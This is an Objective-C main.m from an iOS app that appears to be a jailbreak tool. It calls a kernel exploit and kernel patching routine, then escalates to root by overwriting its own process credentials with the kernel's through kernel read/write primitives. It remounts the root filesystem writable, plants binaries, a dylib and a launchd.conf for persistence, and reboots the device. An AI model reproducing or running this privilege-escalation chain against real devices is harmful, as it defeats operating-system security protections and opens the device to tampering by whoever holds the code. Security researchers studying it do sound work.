//
//  main.m
//  bad_queue_app
//
//  Created by staturnz on 6/7/25.
//

#import <UIKit/UIKit.h>
#import "AppDelegate.h"
#import "exploit/exploit.h"
#import "exploit/patches.h"
#include <copyfile.h>
#include <sys/mount.h>
#include <sys/stat.h>

char *get_file_path(const char *fileName) {
    NSString *filePathObj = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:[NSString stringWithUTF8String:fileName]];
    return [filePathObj UTF8String];
}

int main(int argc, char * argv[]) {
    if (access("/bin/bash", F_OK) != -1) {
        print_log("[-] Device is already jailbroken.\n");
        return -1;
    }

    print_log("[*] Running exploit...\n");
    if (run_exploit() != 0) return -1;

    print_log("[*] Patching kernel...\n");
    if (patch_kernel() != 0) return -1;

    uint32_t self_ucred = 0;
    if (getuid() != 0 || getgid() != 0) {
        print_log("[*] Set uid to 0...\n");
        uint32_t kern_ucred = kread32(kinfo->kern_proc_addr + kinfo->offsets.proc.ucred);
        self_ucred = kread32(kinfo->self_proc_addr + kinfo->offsets.proc.ucred);
        kwrite32(kinfo->self_proc_addr + kinfo->offsets.proc.ucred, kern_ucred);
        setuid(0);
        setgid(0);
    }
    if (getuid() != 0 || getgid() != 0) return -1;

    print_log("[*] Remounting RootFS...\n");
    char* nmr = strdup("/dev/disk0s1s1");
    int mntr = mount("hfs", "/", MNT_UPDATE, &nmr);
    print_log("[*] remount = %d\n",mntr);
    if (mntr != 0) return -1;
    sync();

    print_log("[*] Copying Aquila files...\n");
    if (copyfile(get_file_path("resource/tar"), "/bin/tar", NULL, COPYFILE_ALL) != 0) return -1;
    if (copyfile(get_file_path("resource/launchd.conf"), "/private/etc/launchd.conf", NULL, COPYFILE_ALL) != 0) return -1;
    mkdir("/private/var/aquila", 0755);
    if (copyfile(get_file_path("resource/_libmis.dylib"), "/private/var/aquila/_libmis.dylib", NULL, COPYFILE_ALL) != 0) return -1;
    if (copyfile(get_file_path("resource/bootstrap.tar"), "/private/var/aquila/bootstrap.tar", NULL, COPYFILE_ALL) != 0) return -1;
    if (copyfile(get_file_path("resource/aquila"), "/private/var/aquila/aquila", NULL, COPYFILE_ALL) != 0) return -1;
    if (copyfile(get_file_path("resource/installer"), "/private/var/aquila/installer", NULL, COPYFILE_ALL) != 0) return -1;
    if (copyfile(get_file_path("resource/splashscreen.jp2"), "/private/var/aquila/splashscreen.jp2", NULL, COPYFILE_ALL) != 0) return -1;
    chmod("/private/var/aquila/_libmis.dylib", 0755);
    chmod("/private/var/aquila/aquila", 0755);
    chmod("/private/var/aquila/installer", 0755);

    print_log("[*] Done. Rebooting...");
    reboot(0);

    return 0;
    NSString * appDelegateClassName;
    @autoreleasepool {
        // Setup code that might create autoreleased objects goes here.
        appDelegateClassName = NSStringFromClass([AppDelegate class]);
    }
    return UIApplicationMain(argc, argv, nil, appDelegateClassName);
}
